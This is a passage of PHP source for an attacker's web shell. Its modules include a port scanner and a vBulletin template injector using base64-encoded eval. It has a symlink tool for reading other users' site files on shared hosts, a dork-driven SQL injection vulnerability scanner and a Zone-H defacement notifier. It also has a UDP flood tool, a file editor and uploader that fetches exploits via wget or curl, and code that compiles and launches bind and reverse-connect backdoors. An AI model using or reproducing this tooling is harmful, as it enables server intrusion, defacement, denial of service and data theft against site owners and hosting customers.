$getip = @file_get_contents("http://networktools.nl/asinfo/$site");
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}

function sws_site_ser($site)
{
$getip = @file_get_contents("http://networktools.nl/reverseip/$site");
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}

function sws_sup_dom($site)
{
$getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
$ip    = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');

return $ip;
flush();
}

function sws_port_scan($ip)
{

$list_post = array('80','21','22','2082','25','53','110','443','143');

foreach ($list_post as $o_port)
{
$connect = @fsockopen($ip,$o_port,$errno,$errstr,5);

           if($connect)
           {
           echo " $ip : $o_port    &nbsp;&nbsp;&nbsp; <u style=\"color: #009900\">Open</u> <br /><br />";
           flush();
           }
}

}

function findit($mytext,$starttag,$endtag) {
 $posLeft  = @stripos($mytext,$starttag)+strlen($starttag);
 $posRight = @stripos($mytext,$endtag,$posLeft+1);
 return  @substr($mytext,$posLeft,$posRight-$posLeft);
 flush();
}

echo '<br><br><center>';


echo '
<br />
<div class="sc"><form method="post">
Site to scan : <input type="text" name="site" size="30" style="color:#FF0000;background-color:#000000" value="site.com"   /> &nbsp;&nbsp <input type="submit" style="color:#FF0000;background-color:#000000" name="scan" value="Scan !"  />
</form></div>';


if(isset($_POST['scan']))
{




$site =  @htmlentities($_POST['site']);
                 if (empty($site)){die('<br /><br /> Not add IP .. !');}

$ip_port = @gethostbyname($site);

echo "





<br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>

<div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
<div class=\"ru\"> <br /><br /><pre>
";
echo "".sws_port_scan($ip_port)." </pre></div> ";

flush();



echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
<div class=\"ru\">
<pre>".sws_domain_info($site)."</pre></div>";
flush();

echo "
<div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_net_info($site)."</pre> </div>";
flush();

echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_sup_dom($site)."</pre> </div>";
flush();


echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_site_ser($site)."</pre> </div>
<div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
flush();

}

echo '</center>';
}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=vb" method="post">

<br><br><br><div align="center">
<H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
<font color="#00FF00">&nbsp;vB Index Changer</font><font color="#FF0000">
<font face="Tahoma">! Change All Pages For Forum !&nbsp;
<br></font></div><br>

<?

if(empty($_POST['index'])){
echo "<center><FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" style='color:#FF0000;background-color:#000000' name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" style='color:#FF0000;background-color:#000000' value=\"forum_vb\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" style='color:#FF0000;background-color:#000000' value=\"forum_vb\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" style='color:#FF0000;background-color:#000000' value=\"vb\" name=\"password\" type=\"text\"><br>
<br>
<textarea name=\"index\" cols=\"70\" rows=\"30\">Set Your Index</textarea><br>
<INPUT value=\"Set\" style='color:#FF0000;background-color:#000000' name=\"send\" type=\"submit\">
</FORM></center>";
}else{
$localhost = $_POST['localhost'];
$database = $_POST['database'];
$username = $_POST['username'];
$password = $_POST['password'];
$index = $_POST['index'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());

$index=str_replace("\'","'",$index);

$set_index = "{\${eval(base64_decode(\'";

$set_index .= base64_encode("echo \"$index\";");


$set_index .= "\'))}}{\${exit()}}</textarea>";

echo("UPDATE template SET template ='".$set_index."' ") ;
$ok=@mysql_query("UPDATE template SET template ='".$set_index."'") or die(mysql_error());

if($ok){
echo "!! update finish !!<br><br>";
}

}
# Footer
}
	
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">

<?php   

@set_time_limit(0);

echo "<center>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#FF0000' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}


elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=About" method="post">

<center><br><br><font size=2> Dalam section ini, saya ingin mengucapkan terima kasih kepada tuan punya shell ini, Alex John & the team
kerana membenarkan saya mengubahsuai dan menambah function-function yang lain di dalam shell ini, all the credit ditujukan kepada
dia  :) <img src='http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/1.gif' /></font><br>
<font size=2> Tidak lupa juga kepada rakan saya,namanya rahsia, hehehe, kerana membantu saya sedikit di dalam PHP, credit juga ditujukan
kepada beliau  :) <img src='http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/16.gif' /></font><br>
<font size=2> Semua function-function tambahan ini bukan-lah saya yang merekanya, saya edit dari macam2 shell dan masukkan ia ke dalam
shell ini  <img src='http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/10.gif' /></font><br>
<font size=2> Kalau ada apa2 yang tak kena, calling2 tau <img src='http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/101.gif' /> kerana 
saya juga kadang2 buat silap, nooblah kan <img src'http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/20.gif' /></font><br>
<font size=2> Saya lepaskan shell nie bersama code asalnya sekali  <img src='http://torrent.jiwang.cc/images/smilies/strongbench.gif' />, tetapi dilarang mengubah shell ini kepada nama anda, hormati orang asal yang mengedit shell ini <img src='http://torrent.jiwang.cc/images/smilies/rant.gif' /></font><br><br>
<font size=2> Lastly, kepada <a href='http://www.facebook.com/machocyb3rcrime' target='_blank'>Macho Gayies A/L Tambi</a>, jgn duk gatal2 pulak meh edit shell nie seperti mana kamu melakukannya di local domain versi afnum</font><br>
<font size=2> Baiklah, sampai di sini saja ya creditnya, terima kasih kerana menggunakan shell ini. <img src='http://torrent.jiwang.cc/images/smilies/wave.gif' /></font></center><br><br><br><br>

<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'sqli-scanner'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=sqli-scanner" method="post">

<?php

echo '<br><br><center><form method="post" action=""><font color="red">Dork :</font> <input type="text" value="" name="dork" style="color:#FF0000;background-color:#000000" size="20"/><input type="submit" style="color:#FF0000;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}

ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'zone-h')){	?>
<form action="?y=<?php echo $pwd; ?>&amp;x=zone-h" method="post">
<br><br><? echo '<p style="text-align: center;"> <img alt="" src="http://www.zone-h.org/images/logo.gif" style="width: 261px; height: 67px;" /></p>
<center><span style="font-size:1.6em;"> .: Notifier :. </span></center><center><form action="" method="post"><input class="inputz" type="text" name="defacer" size="67" value="Newbie3viLc063s" /><br> <select class="inputz" name="hackmode">
<option>------------------------------------SELECT-------------------------------------</option>
<option style="background-color: rgb(0, 0, 0);" value="1">known vulnerability (i.e. unpatched system)</option> 
<option style="background-color: rgb(0, 0, 0);" value="2" >undisclosed (new) vulnerability</option> 
<option style="background-color: rgb(0, 0, 0);" value="3" >configuration / admin. mistake</option> 
<option style="background-color: rgb(0, 0, 0);" value="4" >brute force attack</option> 
<option style="background-color: rgb(0, 0, 0);" value="5" >social engineering</option> 
<option style="background-color: rgb(0, 0, 0);" value="6" >Web Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="7" >Web Server external module intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="8" >Mail Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="9" >FTP Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="10" >SSH Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="11" >Telnet Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="12" >RPC Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="13" >Shares misconfiguration</option> 
<option style="background-color: rgb(0, 0, 0);" value="14" >Other Server intrusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="15" >SQL Injection</option> 
<option style="background-color: rgb(0, 0, 0);" value="16" >URL Poisoning</option> 
<option style="background-color: rgb(0, 0, 0);" value="17" >File Inclusion</option> 
<option style="background-color: rgb(0, 0, 0);" value="18" >Other Web Application bug</option> 
<option style="background-color: rgb(0, 0, 0);" value="19" >Remote administrative panel access bruteforcing</option> 
<option style="background-color: rgb(0, 0, 0);" value="20" >Remote administrative panel access password guessing</option> 
<option style="background-color: rgb(0, 0, 0);" value="21" >Remote administrative panel access social engineering</option> 
<option style="background-color: rgb(0, 0, 0);" value="22" >Attack against administrator(password stealing/sniffing)</option> 
<option style="background-color: rgb(0, 0, 0);" value="23" >Access credentials through Man In the Middle attack</option> 
<option style="background-color: rgb(0, 0, 0);" value="24" >Remote service password guessing</option> 
<option style="background-color: rgb(0, 0, 0);" value="25" >Remote service password bruteforce</option> 
<option style="background-color: rgb(0, 0, 0);" value="26" >Rerouting after attacking the Firewall</option> 
<option style="background-color: rgb(0, 0, 0);" value="27" >Rerouting after attacking the Router</option> 
<option style="background-color: rgb(0, 0, 0);" value="28" >DNS attack through social engineering</option> 

<option style="background-color: rgb(0, 0, 0);" value="29" >DNS attack through cache poisoning</option> 
<option style="background-color: rgb(0, 0, 0);" value="30" >Not available</option> 
option style="background-color: rgb(0, 0, 0);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option>
</select> <br>

<select class="inputz" name="reason">
<option >------------------------------------SELECT-------------------------------------</option> 
<option style="background-color: rgb(0, 0, 0);" value="1" >Heh...just for fun!</option> 
<option style="background-color: rgb(0, 0, 0);" value="2" >Revenge against that website</option> 
<option style="background-color: rgb(0, 0, 0);" value="3" >Political reasons</option> 
<option style="background-color: rgb(0, 0, 0);" value="4" >As a challenge</option> 
<option style="background-color: rgb(0, 0, 0);" value="5" >I just want to be the best defacer</option> 
<option style="background-color: rgb(0, 0, 0);" value="6" >Patriotism</option> 
<option style="background-color: rgb(0, 0, 0);" value="7" >Not available</option> 
option style="background-color: rgb(0, 0, 0);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option> 
</select> <br>
<textarea class="inputz" name="domain" cols="90" rows="20">List Of Domains, 20 Rows.</textarea><br>
<input class="inputz" type="submit" value=" Send Now !! " name="SendNowToZoneH"/> 
</form>'; ?> 
<? 
    echo "</form></center>";?> 
<? 
function ZoneH($url, $hacker, $hackmode,$reson, $site ) 
{ 
    $k = curl_init(); 
    curl_setopt($k, CURLOPT_URL, $url); 
    curl_setopt($k,CURLOPT_POST,true); 
    curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson); 
    curl_setopt($k,CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($k, CURLOPT_RETURNTRANSFER, true); 
    $kubra = curl_exec($k); 
    curl_close($k); 
    return $kubra; 
} 
{ 
                ob_start(); 
                $sub = @get_loaded_extensions(); 
                if(!in_array("curl", $sub)) 
                { 
                    die('<center><b>[-] Curl Is Not Supported !![-]</b></center>'); 
                } 
             
                $hacker = $_POST['defacer']; 
                $method = $_POST['hackmode']; 
                $neden = $_POST['reason']; 
                $site = $_POST['domain']; 
                 
                if (empty($hacker)) 
                { 
                    die ("<center><b>[+] YOU MUST FILL THE ATTACKER NAME [+]</b></center>"); 
                } 
                elseif($method == "--------SELECT--------")  
                { 
                    die("<center><b>[+] YOU MUST SELECT THE METHOD [+]</b></center>"); 
                } 
                elseif($neden == "--------SELECT--------")  
                { 
                    die("<center><b>[+] YOU MUST SELECT THE REASON [+]</b></center>"); 
                } 
                elseif(empty($site))  
                { 
                    die("<center><b>[+] YOU MUST INTER THE SITES LIST [+]</b></center>"); 
                } 
                $i = 0; 
                $sites = explode("\n", $site); 
                while($i < count($sites))  
                { 
                    if(substr($sites[$i], 0, 4) != "http")  
                    { 
                        $sites[$i] = "http://".$sites[$i]; 
                    } 
                    ZoneH("http://www.zone-h.com/notify/single", $hacker, $method, $neden, $sites[$i]); 
                    echo "Domain : ".$sites[$i]." Defaced Last Years !"; 
                    ++$i; 
                } 
                echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]"; 
            } 
?>
<?php }

elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
	<?php
	
	//UDP
	if(isset($_GET['host'])&&isset($_GET['time']))
		{
		$packets = 0;
		ignore_user_abort(TRUE);
		set_time_limit(0);
		
		$exec_time = $_GET['time'];
		
		$time = time();
		//print "Started: ".time('d-m-y h:i:s')."<br>";
		$max_time = $time+$exec_time;
		
		$host = $_GET['host'];
		
		for($i=0;$i<65000;$i++){
			$out .= 'X';
		}
		
		while(1){
			$packets++;
			if(time() > $max_time){ break; }
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp){
				fwrite($fp, $out);
				fclose($fp);
			}
		}
	
		echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
		echo '<br><br>
		<form action="'.$surl.'" method=GET>
			<input type="hidden" name="act" value="phptools">
			Host: <br><input type=text name=host><br>
			Length (seconds): <br><input type=text name=time><br>
			<input type=submit value=Go>
		</form>';
		}
	else
		{ 
		echo '<center><form action=? method=GET><input type="hidden" name="act" value="phptools">
			<table class="tabnet" style="width:300px;"> 
				<tr>
					<th colspan="2">UDP Flood</th>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Host</td>
					<td><input style="width:220px;" class="inputz" type=text name=host value=></td>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Length (seconds)</td>
					<td><input style="width:220px;" class="inputz" type=text name=time value=></td>
				</tr> 
				<tr>
					<td><input style="width:100%;" class="inputzbut" type="submit" value="Attack !" /></td>
				</tr> 
			</table>
		      </center>';
		}
	}

elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
	<?php
	
	//UDP
	if(isset($_GET['host'])&&isset($_GET['time']))
		{
		$packets = 0;
		ignore_user_abort(TRUE);
		set_time_limit(0);
		
		$exec_time = $_GET['time'];
		
		$time = time();
		//print "Started: ".time('d-m-y h:i:s')."<br>";
		$max_time = $time+$exec_time;
		
		$host = $_GET['host'];
		
		for($i=0;$i<65000;$i++){
			$out .= 'X';
		}
		
		while(1){
			$packets++;
			if(time() > $max_time){ break; }
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp){
				fwrite($fp, $out);
				fclose($fp);
			}
		}
	
		echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
		echo '<br><br>
		<form action="'.$surl.'" method=GET>
			<input type="hidden" name="act" value="phptools">
			Host: <br><input type=text name=host><br>
			Length (seconds): <br><input type=text name=time><br>
			<input type=submit value=Go>
		</form>';
		}
	else
		{ 
		echo '<center><form action=? method=GET><input type="hidden" name="act" value="phptools">
			<table class="tabnet" style="width:300px;"> 
				<tr>
					<th colspan="2">UDP Flood</th>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Host</td>
					<td><input style="width:220px;" class="inputz" type=text name=host value=></td>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Length (seconds)</td>
					<td><input style="width:220px;" class="inputz" type=text name=time value=></td>
				</tr> 
				<tr>
					<td><input style="width:100%;" class="inputzbut" type="submit" value="Go" /></td>
				</tr> 
			</table>
		      </center>';
		}
	}


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo'))
	{ 
	@ob_start(); 
	@eval("phpinfo();"); 
	$buff = @ob_get_contents(); 
	@ob_end_clean(); 
	$awal = strpos($buff,"<body>")+6; 
	$akhir = strpos($buff,"</body>"); 
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>"; 
	} 

elseif(isset($_GET['view']) && ($_GET['view'] != ""))
	{ 
	if(is_file($_GET['view']))
		{ 
		if(!isset($file)) $file = magicboom($_GET['view']); 
		if(!$win && $posix)
			{ 
			$name=@posix_getpwuid(@fileowner($file)); 
			$group=@posix_getgrgid(@filegroup($file)); 
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
			} 
		else { $owner = $user; } 
		$filn = basename($file); 
		echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\"> 
			<tr>
				<td>Filename</td>
				<td>
					<span id=\"".clearspace($filn)."_link\">".$file."</span> 
					<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" /> 
					</form> 
				</td>
			</tr> 
			<tr>
				<td>Size</td>
				<td>".ukuran($file)."</td>
			</tr> 
			<tr>
				<td>Permission</td>
				<td>".get_perms($file)."</td>
			</tr> 
			<tr>
				<td>Owner</td>
				<td>".$owner."</td>
			</tr> 
			<tr>
				<td>Create time</td>
				<td>".date("d-M-Y H:i",@filectime($file))."</td>
			</tr> 
			<tr>
				<td>Last modified</td>
				<td>".date("d-M-Y H:i",@filemtime($file))."</td>
			</tr> 
			<tr>
				<td>Last accessed</td>
				<td>".date("d-M-Y H:i",@fileatime($file))."</td>
			</tr> 
			<tr>
				<td>Actions</td>
				<td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> 
					| <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> 
					| <a href=\"?y=$pwd&amp;delete=$file\">delete</a> 
					| <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gz</a>)
				</td>
			</tr> 
			<tr>
				<td>View</td>
				<td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> 
					| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> 
					| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">img</a>
				</td>
			</tr> 
		</table> "; 
		if(isset($_GET['type']) && ($_GET['type']=='image'))
			{ echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>"; } 
		elseif(isset($_GET['type']) && ($_GET['type']=='code'))
			{ echo "<div class=\"viewfile\">"; $file = wordwrap(@file_get_contents($file),"240","\n"); @highlight_string($file); echo "</div>"; } 
		else 	{ echo "<div class=\"viewfile\">"; echo nl2br(htmlentities((@file_get_contents($file)))); echo "</div>"; } 
		} 
	elseif(is_dir($_GET['view'])){ echo showdir($pwd,$prompt); } 
	} 

elseif(isset($_GET['edit']) && ($_GET['edit'] != ""))
	{ 
	if(isset($_POST['save']))
		{ 
		$file = $_POST['saveas']; 
		$content = magicboom($_POST['content']); 
		if($filez = @fopen($file,"w"))
			{ 
			$time = date("d-M-Y H:i",time()); 
			if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time; 
			else $msg = "failed to save"; @fclose($filez); 
			} 
		else $msg = "permission denied"; 
		} 
	if(!isset($file)) $file = $_GET['edit']; 
	if($filez = @fopen($file,"r"))
		{ 
		$content = ""; 
		while(!feof($filez))
			{ 
			$content .= htmlentities(str_replace("''","'",fgets($filez))); 
			} 
		@fclose($filez); 
		} ?> 
	<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
		<table class="cmdbox"> 
			<tr>
				<td colspan="2"> 
				<textarea class="output" name="content"> <?php echo $content; ?> </textarea> 
				</td>
			<tr>
				<td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" />
				<input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg; ?>
				</td>
			</tr> 
		</table> 
	</form> 
<?php 
	} 

elseif(isset($_GET['x']) && ($_GET['x'] == 'upload'))
	{ 
	if(isset($_POST['uploadcomp']))
		{ 
		if(is_uploaded_file($_FILES['file']['tmp_name']))
			{ 
			$path = magicboom($_POST['path']); 
			$fname = $_FILES['file']['name']; 
			$tmp_name = $_FILES['file']['tmp_name']; 
			$pindah = $path.$fname; 
			$stat = @move_uploaded_file($tmp_name,$pindah); 
			if ($stat) { $msg = "file uploaded to $pindah"; } 
			else $msg = "failed to upload $fname"; 
			} 
		else $msg = "failed to upload $fname"; 
		} 
	elseif(isset($_POST['uploadurl']))
		{ 
		$pilihan = trim($_POST['pilihan']); 
		$wurl = trim($_POST['wurl']); 
		$path = magicboom($_POST['path']); 
		$namafile = download($pilihan,$wurl); 
		$pindah = $path.$namafile; 
		if(is_file($pindah)) { $msg = "file uploaded to DIR $pindah"; } 
		else $msg = "failed ! to upload $namafile"; } 
	?> 
	<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"> 
		<table class="tabnet" style="width:320px;padding:0 1px;"> 
			<tr>
				<th colspan="2">Upload from computer</th>
			</tr> 
			<tr>
				<td colspan="2">
					<p style="text-align:center;">
					<input style="color:#000000;" type="file" name="file" />
					<input type="submit" name="uploadcomp" class="inputzbut" value="Go !" style="width:80px;">
					</p>
				</td> 
			</tr>
			<tr>
				<td colspan="2">
					<input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" />
				</td>
			</tr> 
		</table>
	</form> 
	<table class="tabnet" style="width:320px;padding:0 1px;"> 
		<tr>
			<th colspan="2">Upload from url</th>
		</tr> 
		<tr>
			<td colspan="2">
				<form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"> 
					<table>
						<tr>
							<td>url</td>
							<td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td>
						</tr> 
						<tr>
							<td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td>
						</tr> 
						<tr>
							<td>
							<select size="1" class="inputz" name="pilihan"> 
								<option value="wwget">wget</option> 
								<option value="wlynx">lynx</option> 
								<option value="wfread">fread</option> 
								<option value="wfetch">fetch</option> 
								<option value="wlinks">links</option> 
								<option value="wget">GET</option> 
								<option value="wcurl">curl</option> 
							</select>
							</td>
							<td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go !" style="width:246px;"></td>
						</tr>
					</table>
				</form>
			</td> 
		</tr> 
	</table> 
	<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> 
<?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit'))
	{ 
	if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) 
		{ 	
		$port = trim($_POST['port']); 
		$passwrd = trim($_POST['bind_pass']); 
		tulis("bdc.c",$port_bind_bd_c); 
		exe("gcc -o bdc bdc.c"); 
		exe("chmod 777 bdc"); 
		@unlink("bdc.c"); 
		exe("./bdc ".$port." ".$passwrd." &"); 
		$scan = exe("ps aux"); 
		if(eregi("./bdc $por",$scan))
			{ 
			$msg = "<p>Process found running, backdoor setup successfully.</p>"; 
			} 
		else 
			{ 
			$msg = "<p>Process not found running, backdoor not setup successfully.</p>"; 
			} 
		} 
	elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) 
		{ 
		$port = trim($_POST['port']); 
		$passwrd = trim($_POST['bind_pass']); 
		tulis("bdp",$port_bind_bd_pl); 
		exe("chmod 777 bdp"); 
		$p2=which("perl"); 
		exe($p2." bdp ".$port." &"); 
		$scan = exe("ps aux"); 
		if(eregi("$p2 bdp $port",$scan))
			{ $msg = "<p>Process found running, backdoor setup successfully.</p>"; } 
		else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; } } 
	elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) 
		{ 
		$ip = trim($_POST['ip']); 
		$port = trim($_POST['backport']); 
		tulis("bcc.c",$back_connect_c); 
		exe("gcc -o bcc bcc.c"); 
		exe("chmod 777 bcc"); 
		@unlink("bcc.c"); 
		exe("./bcc ".$ip." ".$port." &"); 
		$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
		} 
	elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) 
		{ 
		$ip = trim($_POST['ip']); 
		$port = trim($_POST['backport']); 
		tulis("bcp",$back_connect); 
		exe("chmod +x bcp"); 
		$p2=which("perl"); 
		exe($p2." bcp ".$ip." ".$port." &"); 
		$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
		} 
	elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) 
		{ 
		$pilihan = trim($_POST['pilihan']); 
		$wurl = trim($_POST['wurl']); 
		$namafile = download($pilihan,$wurl); 
